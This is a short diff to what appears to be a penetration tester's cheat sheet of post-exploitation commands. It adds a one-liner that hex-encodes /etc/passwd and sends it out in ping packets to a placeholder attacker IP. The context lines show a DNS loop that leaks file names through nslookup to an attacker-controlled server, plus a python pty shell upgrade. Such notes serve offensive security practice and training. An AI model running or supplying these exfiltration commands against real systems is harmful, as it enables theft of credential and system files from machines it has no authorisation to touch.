@@ -3,6 +3,9 @@
 #Basic DNS Tunneling
 for i in `ls`; do nslookup $i.com <your_ip>; done
 
+#Basic ICMP Tunneling
+xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line <attacking_ip>; done
+
 #Spawn python pty 
 python -c 'import pty; pty.spawn("/bin/bash")'
 -> CTRL+Z shell
